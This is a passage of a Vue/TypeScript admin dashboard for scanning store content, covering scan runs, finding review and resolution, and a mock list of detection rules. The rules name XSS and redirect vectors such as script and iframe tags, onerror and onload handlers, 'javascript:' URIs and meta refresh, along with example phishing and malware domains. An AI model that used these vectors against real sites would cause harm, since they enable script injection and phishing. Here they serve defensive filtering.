    matchedValue: 'None (Resolved)',
    contextSnippetBefore: '...Built with 3D V-Cache technology for ultimate gaming performance. ',
    contextSnippetMatched: 'Sanitized Content',
    contextSnippetAfter: ' Compatible with AM5 socket motherboards...',
    lineOffset: 8,
    scannedAt: '2026-08-25 09:40 UTC',
    storefrontUrl: '/product/amd-ryzen-7-7800x3d/',
    adminEditUrl: '/admin/products?modal=edit&id=155'
  }
]);

// ==========================================
// Detection Rules Mock Data
// ==========================================
const rules = ref<DetectionRule[]>([
  // Keywords
  { id: 'R-KW-01', type: 'keyword', pattern: 'free crypto giveaway', category: 'Spam & Scam', severity: 'High', description: 'Detects crypto phishing and fraudulent giveaway phrases in product bodies', enabled: true, matchCount: 14, updatedAt: '2026-08-20' },
  { id: 'R-KW-02', type: 'keyword', pattern: 'whatsapp +', category: 'Off-Platform Contacts', severity: 'Medium', description: 'Blocks direct off-platform messaging solicitation numbers', enabled: true, matchCount: 8, updatedAt: '2026-08-18' },
  { id: 'R-KW-03', type: 'keyword', pattern: 'telegram @', category: 'Off-Platform Contacts', severity: 'Medium', description: 'Blocks unauthorized Telegram support contact strings', enabled: true, matchCount: 19, updatedAt: '2026-08-15' },
  { id: 'R-KW-04', type: 'keyword', pattern: 'viagra|cialis|casino bonus', category: 'Spam Blacklist', severity: 'Critical', description: 'Strict pharma and gambling spam keyword blacklist', enabled: true, matchCount: 42, updatedAt: '2026-08-10' },
  
  // Domains
  { id: 'R-DM-01', type: 'domain', pattern: 'casino-example.com', category: 'Gambling Blacklist', severity: 'Critical', description: 'Blacklisted affiliate casino redirect portal', enabled: true, matchCount: 3, updatedAt: '2026-08-22' },
  { id: 'R-DM-02', type: 'domain', pattern: 'free-giveaway-zone.xyz', category: 'Phishing Host', severity: 'Critical', description: 'Known phishing lure hosting fake reward claim forms', enabled: true, matchCount: 6, updatedAt: '2026-08-21' },
  { id: 'R-DM-03', type: 'domain', pattern: 'tracker-telemetry.biz', category: 'Tracking & Adware', severity: 'High', description: 'Unapproved third-party tracking pixel script host', enabled: true, matchCount: 1, updatedAt: '2026-08-19' },
  { id: 'R-DM-04', type: 'domain', pattern: 'free-file-vault-dl.com', category: 'Malicious Downloads', severity: 'Critical', description: 'Suspicious executable payload distribution domain', enabled: true, matchCount: 2, updatedAt: '2026-08-12' },

  // HTML
  { id: 'R-HT-01', type: 'html', pattern: '<script>', category: 'Dangerous Tags', severity: 'Critical', description: 'Strict ban on raw inline or external script tags in rich text', enabled: true, matchCount: 11, updatedAt: '2026-08-24' },
  { id: 'R-HT-02', type: 'html', pattern: '<iframe>', category: 'Embedded Content', severity: 'Critical', description: 'Disallows embedded third party frames and overlays', enabled: true, matchCount: 4, updatedAt: '2026-08-24' },
  { id: 'R-HT-03', type: 'html', pattern: '<object>', category: 'Plugin Objects', severity: 'Critical', description: 'Blocks legacy ActiveX and object execution containers', enabled: true, matchCount: 0, updatedAt: '2026-08-10' },
  { id: 'R-HT-04', type: 'html', pattern: '<embed>', category: 'Plugin Objects', severity: 'Critical', description: 'Disallows binary payload embedding tags', enabled: true, matchCount: 0, updatedAt: '2026-08-10' },
  { id: 'R-HT-05', type: 'html', pattern: '<base>', category: 'DOM Hijacking', severity: 'Critical', description: 'Prevents base URL redirection hijacking in rich descriptions', enabled: true, matchCount: 1, updatedAt: '2026-08-05' },

  // Attributes
  { id: 'R-AT-01', type: 'attribute', pattern: 'onerror', category: 'Event Handlers', severity: 'Critical', description: 'Blocks inline image / media error event handler execution', enabled: true, matchCount: 5, updatedAt: '2026-08-23' },
  { id: 'R-AT-02', type: 'attribute', pattern: 'onclick', category: 'Event Handlers', severity: 'Critical', description: 'Disallows raw click event attributes in customer content', enabled: true, matchCount: 9, updatedAt: '2026-08-23' },
  { id: 'R-AT-03', type: 'attribute', pattern: 'onload', category: 'Event Handlers', severity: 'Critical', description: 'Blocks body and element load event injection triggers', enabled: true, matchCount: 2, updatedAt: '2026-08-20' },
  { id: 'R-AT-04', type: 'attribute', pattern: 'javascript:', category: 'URI Scheme', severity: 'Critical', description: 'Blocks pseudo-protocol javascript execution in href attributes', enabled: true, matchCount: 7, updatedAt: '2026-08-15' },
  { id: 'R-AT-05', type: 'attribute', pattern: 'formaction', category: 'Form Redirection', severity: 'High', description: 'Blocks formaction override on input and button tags', enabled: true, matchCount: 0, updatedAt: '2026-08-08' },

  // Redirects
  { id: 'R-RD-01', type: 'redirect', pattern: 'http-equiv="refresh"', category: 'Meta Navigation', severity: 'Critical', description: 'Disallows automated client-side meta refresh triggers', enabled: true, matchCount: 2, updatedAt: '2026-08-22' },
  { id: 'R-RD-02', type: 'redirect', pattern: 'window.location', category: 'DOM Redirection', severity: 'Critical', description: 'Detects JavaScript navigation hijacking attempts', enabled: true, matchCount: 1, updatedAt: '2026-08-18' },
  { id: 'R-RD-03', type: 'redirect', pattern: 'bit.ly/|tinyurl.com/', category: 'URL Shorteners', severity: 'Medium', description: 'Flags obfuscated shortener URLs that hide actual destinations', enabled: true, matchCount: 18, updatedAt: '2026-08-14' }
]);

const visibleSubTabs = computed(() => {
  const tabs = [];
  if (canViewKeywords.value) {
    tabs.push({ id: 'keywords', label: 'Keywords', count: detectionRulesSummary.value.keyword_rules });
  }
  if (canViewDomains.value) {
    tabs.push({ id: 'domains', label: 'Domains', count: detectionRulesSummary.value.domain_rules });
  }
  if (canViewHiddenContent.value) {
    tabs.push({ id: 'hidden_content', label: 'Hidden Content', count: detectionRulesSummary.value.hidden_content_rules });
  }
  if (canViewObfuscation.value) {
    tabs.push({ id: 'obfuscation', label: 'Obfuscation', count: detectionRulesSummary.value.obfuscation_rules });
  }
  if (canViewRedirects.value) {
    tabs.push({ id: 'redirects', label: 'Redirect Rules', count: detectionRulesSummary.value.redirect_rules });
  }
  if (canViewHtmlAttributeRules.value) {
    tabs.push({ id: 'attributes', label: 'Dangerous Attributes', count: detectionRulesSummary.value.html_attribute_rules });
  }
  if (canViewHtmlTagRules.value) {
    tabs.push({ id: 'html', label: 'Dangerous HTML', count: detectionRulesSummary.value.html_tag_rules });
  }
  return tabs;
});

// ==========================================
// Filter State for Scan Results
// ==========================================
const searchQuery = ref('');
const debouncedSearch = refDebounced(searchQuery, 300);
const filterContentType = ref('all');
const filterStatus = ref('all');
const filterSeverity = ref('all');
const filterDetector = ref('all');
const filterCategory = ref('all');

// Pagination
const currentPage = ref(1);
const itemsPerPage = ref(10);

// Content Scans States & Fetching
const isContentScansLoading = ref(false);
const contentScansError = ref<string | null>(null);
const contentScansData = ref<ContentScan[]>([]);
const contentScansCount = ref(0);
const contentScansPages = ref(1);

const fetchContentScans = async () => {
  if (!canViewContentScans.value) return;

  isContentScansLoading.value = true;
  contentScansError.value = null;

  try {
    const params: ContentScansQueryParams = {
      page: currentPage.value,
      page_size: itemsPerPage.value
    };

    if (searchQuery.value.trim()) {
      params.search = searchQuery.value.trim();
    }
    if (filterContentType.value !== 'all') {
      params.content_type = filterContentType.value;
    }
    if (filterStatus.value !== 'all') {
      params.status = filterStatus.value;
    }

    const response = await contentSecurityService.getContentScans(params);
    contentScansData.value = response.results;
    contentScansCount.value = response.count;
    contentScansPages.value = response.pages;
  } catch (err: any) {
    contentScansError.value = extractErrorMessage(err, 'Failed to retrieve content scans.');
  } finally {
    isContentScansLoading.value = false;
  }
};

watch([debouncedSearch, filterContentType, filterStatus, itemsPerPage], () => {
  currentPage.value = 1;
  if (mainTab.value === 'results') {
    fetchContentScans();
  }
});

watch(currentPage, () => {
  if (mainTab.value === 'results') {
    fetchContentScans();
  }
});

const resetFilters = () => {
  searchQuery.value = '';
  filterContentType.value = 'all';
  filterStatus.value = 'all';
  filterSeverity.value = 'all';
  filterDetector.value = 'all';
  filterCategory.value = 'all';
  toastInfo('Filters have been reset.');
};

// Summary metrics computed
const summaryMetrics = computed(() => {
  const total = totalEntitiesScanned.value;
  const critical = findings.value.filter(f => f.status === 'Critical').length;
  const high = findings.value.filter(f => f.status === 'High Risk').length;
  const needsReview = findings.value.filter(f => f.status === 'Needs Review').length;
  const clean = total - (critical + high + needsReview);
  const cleanPercent = ((clean / total) * 100).toFixed(1);

  return {
    total,
    clean,
    cleanPercent,
    needsReview,
    high,
    critical
  };
});

// Recent findings for Overview
const recentFindings = computed(() => {
  return findings.value.slice(0, 5);
});

// ==========================================
// Modal State: Finding Details
// ==========================================
const isFindingDetailsLoading = ref(false);
const selectedFindingDetail = ref<ContentScanFindingDetail | null>(null);

const findingModalState = useAdminModalState<ContentScanFindingDetail>({
  getItems: async (id) => {
    if (mainTab.value !== 'findings') return null;
    if (!canViewFindings.value) return null;
    isFindingDetailsLoading.value = true;
    try {
      const details = await contentSecurityService.getContentScanFindingDetails(id);
      return details;
    } catch (err: any) {
      const msg = extractErrorMessage(err, 'Failed to retrieve finding details.');
      toastError(msg);
      return null;
    } finally {
      isFindingDetailsLoading.value = false;
    }
  },
  onResolveError: (id) => {
    if (mainTab.value === 'findings') {
      toastError(`Finding #${id} could not be resolved.`);
      findingModalState.closeModal({ replace: true });
    }
  }
});

watch(() => findingModalState.activeEntity.value, (newEntity) => {
  if (newEntity && mainTab.value === 'findings') {
    selectedFindingDetail.value = newEntity;
  }
}, { immediate: true });

watch(() => findingModalState.isView.value, (isView) => {
  if (!isView) {
    selectedFindingDetail.value = null;
  }
}, { immediate: true });

const openFindingDetail = (finding: { id: number | string }) => {
  if (!canViewFindings.value) {
    toastError('You do not have permission to view finding details.');
    return;
  }
  if (mainTab.value !== 'findings') {
    mainTab.value = 'findings';
  }
  findingModalState.openView(finding.id);
};

const closeFindingDetail = () => {
  findingModalState.closeModal();
};

// ==========================================
// Modal State: Finding Review
// ==========================================
const isReviewModalOpen = ref(false);
const reviewTargetFinding = ref<{
  id: number;
  scan?: number;
  content_type?: string;
  detector?: string;
  category?: string;
  severity?: string;
  matched_value?: string;
  review_status?: string;
  review_note?: string | null;
} | null>(null);

const reviewForm = ref<{
  review_status: 'FALSE_POSITIVE' | 'CONFIRMED' | '';
  review_note: string;
}>({
  review_status: 'FALSE_POSITIVE',
  review_note: ''
});

const isReviewSubmitting = ref(false);
const reviewFormError = ref<string | null>(null);

const openFindingReview = (finding: {
  id: number;
  scan?: number;
  content_type?: string;
  detector?: string;
  category?: string;
  severity?: string;
  matched_value?: string;
  review_status?: string;
  review_note?: string | null;
}) => {
  if (!canReviewFinding.value) {
    toastError('You do not have permission to review content scan findings.');
    return;
  }
  reviewTargetFinding.value = finding;
  reviewForm.value = {
    review_status: (finding.review_status === 'CONFIRMED' || finding.review_status === 'FALSE_POSITIVE')
      ? (finding.review_status as 'CONFIRMED' | 'FALSE_POSITIVE')
      : 'FALSE_POSITIVE',
    review_note: finding.review_note || ''
  };
  reviewFormError.value = null;
  isReviewModalOpen.value = true;
};

const closeFindingReview = () => {
  if (isReviewSubmitting.value) return;
  isReviewModalOpen.value = false;
  reviewTargetFinding.value = null;
  reviewFormError.value = null;
};

const submitFindingReview = async () => {
  if (!canReviewFinding.value) {
    toastError('You do not have permission to review content scan findings.');
    return;
  }
  if (!reviewTargetFinding.value) return;

  const status = reviewForm.value.review_status;
  if (!status || (status !== 'FALSE_POSITIVE' && status !== 'CONFIRMED')) {
    reviewFormError.value = 'Please select a valid review decision (False Positive or Confirmed Threat).';
    return;
  }

  const note = reviewForm.value.review_note;
  if (note && note.length > 2000) {
    reviewFormError.value = 'Review note cannot exceed 2000 characters.';
    return;
  }

  reviewFormError.value = null;
  isReviewSubmitting.value = true;

  try {
    const findingId = reviewTargetFinding.value.id;
    const payload: ContentScanFindingReviewRequest = {
      review_status: status
    };
    if (note !== undefined && note !== null && note.trim() !== '') {
      payload.review_note = note.trim();
    } else if (note === '') {
      payload.review_note = '';
    }

    const updated = await contentSecurityService.reviewContentScanFinding(findingId, payload);
    toastSuccess(`Finding #${findingId} review submitted successfully.`);
    closeFindingReview();

    // If currently viewing details for this finding, refresh details
    if (findingModalState.isView.value && selectedFindingDetail.value && String(selectedFindingDetail.value.id) === String(findingId)) {
      try {
        const refreshed = await contentSecurityService.getContentScanFindingDetails(findingId);
        selectedFindingDetail.value = refreshed;
      } catch {
        selectedFindingDetail.value = updated;
      }
    }

    // Refresh findings list to preserve filters, search, and pagination
    await fetchFindings();
  } catch (err: any) {
    const msg = extractErrorMessage(err, 'Failed to submit finding review.');
    reviewFormError.value = msg;
    toastError(msg);
  } finally {
    isReviewSubmitting.value = false;
  }
};

// ==========================================
// Modal State: Finding Resolve
// ==========================================
const isResolveModalOpen = ref(false);
const resolveTargetFinding = ref<{
  id: number;
  scan?: number;
  content_type?: string;
  detector?: string;
  category?: string;
  severity?: string;
  matched_value?: string;
  review_status?: string;
  review_note?: string | null;
} | null>(null);

const resolveForm = ref<{
  review_note: string;
}>({
  review_note: ''
});

const isResolveSubmitting = ref(false);
const resolveFormError = ref<string | null>(null);

const openFindingResolve = (finding: {
  id: number;
  scan?: number;
  content_type?: string;
  detector?: string;
  category?: string;
  severity?: string;
  matched_value?: string;
  review_status?: string;
  review_note?: string | null;
}) => {
  if (!canResolveFinding.value) {
    toastError('You do not have permission to resolve content scan findings.');
    return;
  }
  resolveTargetFinding.value = finding;
  resolveForm.value = {
    review_note: finding.review_note || ''
  };
  resolveFormError.value = null;
  isResolveModalOpen.value = true;
};

const closeFindingResolve = () => {
  if (isResolveSubmitting.value) return;
  isResolveModalOpen.value = false;
  resolveTargetFinding.value = null;
  resolveFormError.value = null;
};

const submitFindingResolve = async () => {
  if (!canResolveFinding.value) {
    toastError('You do not have permission to resolve content scan findings.');
    return;
  }
  if (!resolveTargetFinding.value) return;

  const note = resolveForm.value.review_note;
  if (note && note.length > 2000) {
    resolveFormError.value = 'Resolution note cannot exceed 2000 characters.';
    return;
  }

  resolveFormError.value = null;
  isResolveSubmitting.value = true;

  try {
    const findingId = resolveTargetFinding.value.id;
    const payload: ContentScanFindingResolveRequest = {};
    if (note !== undefined && note !== null && note.trim() !== '') {
      payload.review_note = note.trim();
    } else if (note === '') {
      payload.review_note = '';
    }

    const updated = await contentSecurityService.resolveContentScanFinding(findingId, payload);
    toastSuccess(`Finding #${findingId} marked as resolved successfully.`);
    closeFindingResolve();

    // If currently viewing details for this finding, refresh details
    if (findingModalState.isView.value && selectedFindingDetail.value && String(selectedFindingDetail.value.id) === String(findingId)) {
      try {
        const refreshed = await contentSecurityService.getContentScanFindingDetails(findingId);
        selectedFindingDetail.value = refreshed;
      } catch {
        selectedFindingDetail.value = updated;
      }
    }

    // Refresh findings list to preserve filters, search, and pagination
    await fetchFindings();
  } catch (err: any) {
    const msg = extractErrorMessage(err, 'Failed to resolve content scan finding.');
    resolveFormError.value = msg;
    toastError(msg);
  } finally {
    isResolveSubmitting.value = false;
  }
};

const isScanDetailModalOpen = ref(false);
const selectedContentScan = ref<ContentScanDetail | null>(null);

const openScanDetail = async (scan: ContentScan) => {
  try {
    const details = await contentSecurityService.getContentScanDetails(scan.id);
    selectedContentScan.value = details;
    isScanDetailModalOpen.value = true;
  } catch (err: any) {
    toastError(extractErrorMessage(err, 'Failed to load scan details.'));
  }
};

const closeScanDetail = () => {
  isScanDetailModalOpen.value = false;
  selectedContentScan.value = null;
};

// ==========================================
// Scan Action & Mode Selection
// ==========================================
export type ScanMode = 'specific' | 'content_type' | 'everything';

const scanMode = ref<ScanMode>('specific');
const selectedScanContentType = ref<string>('Product');
const selectedScanObjectId = ref<string | number>('');
const scanFieldsInput = ref<string>('');

const availableScanObjects = ref<Array<{ id: string | number; label: string; sublabel?: string; type: string; typeLabel: string }>>([]);
const isScanObjectsLoading = ref(false);
const scanObjectSearchQuery = ref('');
const debouncedScanObjectQuery = refDebounced(scanObjectSearchQuery, 300);

const scanProductService = useProductService();
const scanCategoryService = useCategoryService();
const scanBrandService = useBrandService();
const scanBlogService = useBlogService();

const supportedContentTypes = computed(() => [
  { value: 'Product', label: 'Products' },
  { value: 'Category', label: 'Categories' },
  { value: 'Brand', label: 'Brands' },
  { value: 'Blog', label: 'Blog Posts' }
]);

const fetchAvailableScanObjects = async () => {
  if (scanMode.value !== 'specific') return;
  isScanObjectsLoading.value = true;
  
  try {
    const query = debouncedScanObjectQuery.value.trim();
    let list: Array<{ id: string | number; label: string; sublabel?: string; type: string; typeLabel: string }> = [];

    // Fetch from all supported endpoints concurrently
    const [productsRes, categoriesRes, brandsRes, blogsRes] = await Promise.allSettled([
      scanProductService.getProductsList({ search: query, page_size: 10 }),
      scanCategoryService.getCategoriesList({ search: query, page_size: 10 }),
      scanBrandService.getBrandsList({ search: query }),
      scanBlogService.getPosts({ query })
    ]);

    if (productsRes.status === 'fulfilled') {
      list.push(...(productsRes.value.results || []).map(p => ({
        id: p.id,
        label: p.name || (p as any).title || `Product #${p.id}`,
        sublabel: p.slug ? `slug: ${p.slug}` : `ID: ${p.id}`,
        type: 'Product',
        typeLabel: 'Product'
      })));
    }
    
    if (categoriesRes.status === 'fulfilled') {
      list.push(...(categoriesRes.value.results || []).map(c => ({
        id: c.id,
        label: c.name || `Category #${c.id}`,
        sublabel: c.slug ? `slug: ${c.slug}` : `ID: ${c.id}`,
        type: 'Category',
        typeLabel: 'Category'
      })));
    }

    if (brandsRes.status === 'fulfilled') {
      const bData = (brandsRes.value as any).value || brandsRes.value || [];
      const brandList = Array.isArray(bData) ? bData : (bData.results || []);
      list.push(...brandList.map((b: any) => ({
        id: b.id,
        label: b.name || `Brand #${b.id}`,
        sublabel: b.slug ? `slug: ${b.slug}` : `ID: ${b.id}`,
        type: 'Brand',
        typeLabel: 'Brand'
      })));
    }

    if (blogsRes.status === 'fulfilled') {
      const pData = (blogsRes.value as any).value || blogsRes.value || [];
      const postList = Array.isArray(pData) ? pData : (pData.results || []);
      list.push(...postList.map((p: any) => ({
        id: p.id,
        label: p.title || `Post #${p.id}`,
        sublabel: p.slug ? `slug: ${p.slug}` : `ID: ${p.id}`,
        type: 'Blog',
        typeLabel: 'Blog Post'
      })));
    }

    availableScanObjects.value = list;

    // Do not auto-select to avoid overwriting user selection when searching
    if (list.length > 0 && (!selectedScanObjectId.value || !list.some(item => String(item.id) === String(selectedScanObjectId.value) && item.type === selectedScanContentType.value))) {
      // We no longer auto-select the first item because it can be jarring
    }
  } catch (err) {
    console.error('Failed to fetch scannable objects:', err);
    availableScanObjects.value = [];
  } finally {
    isScanObjectsLoading.value = false;
  }
};

watch([debouncedScanObjectQuery, scanMode], ([newQuery, newMode]) => {
  if (newMode === 'specific') {
    fetchAvailableScanObjects();
  }
});

const runFullScan = () => {
  scanMode.value = 'specific';
  selectedScanContentType.value = 'Product';
  selectedScanObjectId.value = '';
  scanObjectSearchQuery.value = '';
  scanFieldsInput.value = '';
  isRunScanModalOpen.value = true;
  fetchAvailableScanObjects();
};

const isSubmittingScanRun = ref(false);

const findingsTab = ref();

const submitScanRun = async () => {
  if (isSubmittingScanRun.value) return;

  let payload: ContentScanRunRequest;

  if (scanMode.value === 'specific') {
    if (!selectedScanContentType.value || selectedScanObjectId.value === '' || selectedScanObjectId.value === null || selectedScanObjectId.value === undefined) {
      toastError('Please select a valid content type and target object to scan.');
      return;
    }

    payload = {
      scan_type: 'OBJECT',
      content_type: selectedScanContentType.value.trim().toUpperCase(),
      object_id: Number(selectedScanObjectId.value) || selectedScanObjectId.value
    };

    if (scanFieldsInput.value.trim()) {
      const fields = scanFieldsInput.value
        .split(',')
        .map((f: string) => f.trim())
        .filter((f: string) => f !== '');
      if (fields.length > 0) {
        payload.field_names = fields;
      }
    }
  } else if (scanMode.value === 'content_type') {
    if (!selectedScanContentType.value) {
      toastError('Please select a content type to scan.');
      return;
    }

    payload = {
      scan_type: 'CONTENT_TYPE',
      content_type: selectedScanContentType.value.trim().toUpperCase()
    };
  } else if (scanMode.value === 'everything') {
    payload = {
      scan_type: 'ALL'
    };
  } else {
    return;
  }

  isSubmittingScanRun.value = true;

  try {
    await contentSecurityService.runContentScan(payload);
    const successMsg = scanMode.value === 'everything'
      ? 'System-wide content security scan completed successfully.'
      : scanMode.value === 'content_type'
        ? `Content security scan for ${selectedScanContentType.value} completed successfully.`
        : 'Content security scan completed successfully.';
    toastSuccess(successMsg);
    isRunScanModalOpen.value = false;
    await fetchContentScans();
    if (findingsTab.value && canViewFindings.value) {
      await findingsTab.value.refresh();
    }
  } catch (err: any) {
    toastError(err.message || 'Failed to run content scan.');
  } finally {
    isSubmittingScanRun.value = false;
  }
};




</script>

<template>
  <div class="space-y-6 animate-in fade-in duration-500 pb-12">
    <!-- Header Row -->
    <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-border pb-5">
      <div class="space-y-1">
        <div class="flex items-center gap-2">
          <div class="w-8 h-8 rounded-xl bg-primary/10 border border-primary/20 flex items-center justify-center text-primary shadow-xs">
            <Shield class="w-4 h-4" />
          </div>
          <h1 class="text-2xl sm:text-3xl font-display font-extrabold tracking-tight text-foreground">
            Content Security
          </h1>
          <span class="ml-2 px-2.5 py-0.5 rounded-full text-[10px] font-bold uppercase tracking-wider bg-primary/10 text-primary border border-primary/20">
            Active Guard
          </span>
        </div>
        <p class="text-xs sm:text-sm text-muted-foreground">
          Automated threat detection, payload inspection, and content integrity enforcement across products and categories.
        </p>
      </div>

      <!-- Header Actions -->
      <div class="flex items-center gap-3 shrink-0">
        <div class="text-right hidden md:block">
          <p class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Last Scanned</p>
          <p class="text-xs font-semibold text-foreground flex items-center gap-1">
            <Clock class="w-3 h-3 text-muted-foreground" />
            {{ lastScanTimestamp }}
          </p>
        </div>

        <UiButton 
          v-if="canRunContentScan"
          @click="runFullScan" 
          :disabled="isScanning"
          class="h-10 px-5 gap-2 font-bold text-xs shadow-md shadow-primary/20 whitespace-nowrap"
        >
          <Play v-if="!isScanning" class="w-3.5 h-3.5 fill-current" />
          <RefreshCw v-else class="w-3.5 h-3.5 animate-spin" />
          <span>{{ isScanning ? 'Scanning Catalog...' : 'Run Scan' }}</span>
        </UiButton>
      </div>
    </div>

    <!-- Active Scan Banner (Shows when scan is running) -->
    <div 
      v-if="isScanning" 
      class="bg-card border border-primary/30 rounded-2xl p-4 sm:p-5 shadow-lg relative overflow-hidden animate-in fade-in duration-300"
    >
      <div class="absolute -right-12 -top-12 w-40 h-40 bg-primary/10 rounded-full blur-2xl"></div>
      <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 mb-3 relative z-10">
        <div class="flex items-center gap-3">
          <div class="w-9 h-9 rounded-xl bg-primary text-primary-foreground flex items-center justify-center shrink-0 shadow-sm animate-pulse">
            <ShieldCheck class="w-5 h-5" />
          </div>
          <div>
            <h3 class="text-sm font-bold text-foreground">Executing Full Security Inspection</h3>
            <p class="text-xs text-muted-foreground font-mono">{{ scanStepText }}</p>
          </div>
        </div>
        <div class="text-right font-mono font-bold text-sm text-primary shrink-0">
          {{ scanProgress }}%
        </div>
      </div>
      <!-- Progress Bar -->
      <div class="w-full h-2 bg-muted rounded-full overflow-hidden relative z-10">
        <div 
          class="h-full bg-primary transition-all duration-500 rounded-full"
          :style="{ width: `${scanProgress}%` }"
        ></div>
      </div>
    </div>

    <!-- Primary Section Navigation Tabs -->
    <div class="flex items-center gap-2 border-b border-border">
      <button
        @click="mainTab = 'overview'"
        :class="cn(
          'flex items-center gap-2 px-4 py-3 text-xs sm:text-sm font-bold border-b-2 transition-all cursor-pointer whitespace-nowrap',
          mainTab === 'overview'
            ? 'border-primary text-primary font-extrabold'
            : 'border-transparent text-muted-foreground hover:text-foreground hover:border-border'
        )"
      >
        <SlidersHorizontal class="w-4 h-4" />
        <span>Overview</span>
      </button>

      <button
        @click="mainTab = 'results'"
        :class="cn(
          'flex items-center gap-2 px-4 py-3 text-xs sm:text-sm font-bold border-b-2 transition-all cursor-pointer whitespace-nowrap',
          mainTab === 'results'
            ? 'border-primary text-primary font-extrabold'
            : 'border-transparent text-muted-foreground hover:text-foreground hover:border-border'
        )"
      >
        <AlertTriangle class="w-4 h-4" />
        <span>Scan Results</span>
        <span class="px-2 py-0.5 rounded-full text-[10px] font-extrabold bg-rose-500/15 text-rose-600 dark:text-rose-400 border border-rose-500/30 ml-1">
          {{ summaryMetrics.critical + summaryMetrics.high + summaryMetrics.needsReview }}
        </span>
      </button>

      <button
        v-if="canViewFindings"
        @click="mainTab = 'findings'"
        :class="cn(
          'flex items-center gap-2 px-4 py-3 text-xs sm:text-sm font-bold border-b-2 transition-all cursor-pointer whitespace-nowrap',
          mainTab === 'findings'
            ? 'border-primary text-primary font-extrabold'
            : 'border-transparent text-muted-foreground hover:text-foreground hover:border-border'
        )"
      >
        <AlertCircle class="w-4 h-4" />
        <span>Findings</span>
        <span class="px-2 py-0.5 rounded-full text-[10px] font-extrabold bg-rose-500/15 text-rose-600 dark:text-rose-400 border border-rose-500/30 ml-1">
          {{ findingsCount }}
        </span>
      </button>

      <button
        @click="mainTab = 'rules'"
        :class="cn(
          'flex items-center gap-2 px-4 py-3 text-xs sm:text-sm font-bold border-b-2 transition-all cursor-pointer whitespace-nowrap',
          mainTab === 'rules'
            ? 'border-primary text-primary font-extrabold'
            : 'border-transparent text-muted-foreground hover:text-foreground hover:border-border'
        )"
      >
        <Code2 class="w-4 h-4" />
        <span>Detection Rules</span>
        <span class="px-2 py-0.5 rounded-full text-[10px] font-bold bg-muted text-muted-foreground border border-border ml-1">
          {{ detectionRulesSummary.total }}
        </span>
      </button>
    </div>

    <!-- ========================================== -->
    <!-- SECTION 1: OVERVIEW TAB -->
    <!-- ========================================== -->
    <div v-show="mainTab === 'overview'" class="space-y-6 animate-in fade-in duration-300">
      <!-- Summary Metrics Cards -->
      <div class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-5 gap-3 sm:gap-4">
        <!-- Total Scanned -->
        <div class="bg-card border border-border rounded-2xl p-4 sm:p-5 shadow-xs flex flex-col justify-between">
          <div class="flex items-center justify-between text-muted-foreground mb-3">
            <span class="text-[10px] font-bold uppercase tracking-widest">Total Scanned</span>
            <Layers class="w-4 h-4" />
          </div>
          <div>
            <p class="text-2xl sm:text-3xl font-display font-extrabold text-foreground">
              {{ summaryMetrics.total.toLocaleString() }}
            </p>
            <p class="text-[11px] text-muted-foreground mt-1 font-medium">
              4,120 Products, 186 Categories
            </p>
          </div>
        </div>

        <!-- Clean Rate -->
        <div class="bg-card border border-border rounded-2xl p-4 sm:p-5 shadow-xs flex flex-col justify-between">
          <div class="flex items-center justify-between text-emerald-600 dark:text-emerald-400 mb-3">
            <span class="text-[10px] font-bold uppercase tracking-widest text-muted-foreground">Clean</span>
            <CheckCircle2 class="w-4 h-4" />
          </div>
          <div>
            <p class="text-2xl sm:text-3xl font-display font-extrabold text-emerald-600 dark:text-emerald-400">
              {{ summaryMetrics.clean.toLocaleString() }}
            </p>
            <p class="text-[11px] text-emerald-600/90 dark:text-emerald-400/90 mt-1 font-semibold">
              {{ summaryMetrics.cleanPercent }}% Compliant
            </p>
          </div>
        </div>

        <!-- Needs Review -->
        <div class="bg-card border border-border rounded-2xl p-4 sm:p-5 shadow-xs flex flex-col justify-between">
          <div class="flex items-center justify-between text-amber-600 dark:text-amber-400 mb-3">
            <span class="text-[10px] font-bold uppercase tracking-widest text-muted-foreground">Needs Review</span>
            <Info class="w-4 h-4" />
          </div>
          <div>
            <p class="text-2xl sm:text-3xl font-display font-extrabold text-amber-600 dark:text-amber-400">
              {{ summaryMetrics.needsReview }}
            </p>
            <p class="text-[11px] text-muted-foreground mt-1 font-medium">
              Pending manual inspection
            </p>
          </div>
        </div>

        <!-- High Risk -->
        <div class="bg-card border border-border rounded-2xl p-4 sm:p-5 shadow-xs flex flex-col justify-between">
          <div class="flex items-center justify-between text-orange-600 dark:text-orange-400 mb-3">
            <span class="text-[10px] font-bold uppercase tracking-widest text-muted-foreground">High Risk</span>
            <AlertTriangle class="w-4 h-4" />
          </div>
          <div>
            <p class="text-2xl sm:text-3xl font-display font-extrabold text-orange-600 dark:text-orange-400">
              {{ summaryMetrics.high }}
            </p>
            <p class="text-[11px] text-muted-foreground mt-1 font-medium">
              Dangerous links & attributes
            </p>
          </div>
        </div>

        <!-- Critical -->
        <div class="bg-card border border-rose-500/20 bg-rose-500/5 rounded-2xl p-4 sm:p-5 shadow-xs flex flex-col justify-between col-span-2 sm:col-span-1">
          <div class="flex items-center justify-between text-rose-600 dark:text-rose-400 mb-3">
            <span class="text-[10px] font-bold uppercase tracking-widest text-rose-600 dark:text-rose-400">Critical</span>
            <AlertOctagon class="w-4 h-4" />
          </div>
          <div>
            <p class="text-2xl sm:text-3xl font-display font-extrabold text-rose-600 dark:text-rose-400">
              {{ summaryMetrics.critical }}
            </p>
            <p class="text-[11px] text-rose-600/90 dark:text-rose-400/90 mt-1 font-semibold">
              Immediate action required
            </p>
          </div>
        </div>
      </div>

      <!-- Middle Grid: Detection Breakdown & Scanner Status -->
      <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
        <!-- Detection Method Breakdown -->
        <div class="lg:col-span-4 bg-card border border-border rounded-2xl p-5 shadow-xs flex flex-col justify-between space-y-4">
          <div>
            <h3 class="text-sm font-bold text-foreground flex items-center gap-2">
              <ShieldAlert class="w-4 h-4 text-primary" />
              Threats by Detector Type
            </h3>
            <p class="text-xs text-muted-foreground mt-0.5">Distribution of flagged payloads across rules</p>
          </div>

          <div class="space-y-3">
            <div>
              <div class="flex items-center justify-between text-xs font-semibold mb-1">
                <span class="text-foreground">Blacklisted Domains</span>
                <span class="text-muted-foreground">3 items</span>
              </div>
              <div class="w-full h-1.5 bg-muted rounded-full overflow-hidden">
                <div class="h-full bg-rose-500 rounded-full" style="width: 40%"></div>
              </div>
            </div>

            <div>
              <div class="flex items-center justify-between text-xs font-semibold mb-1">
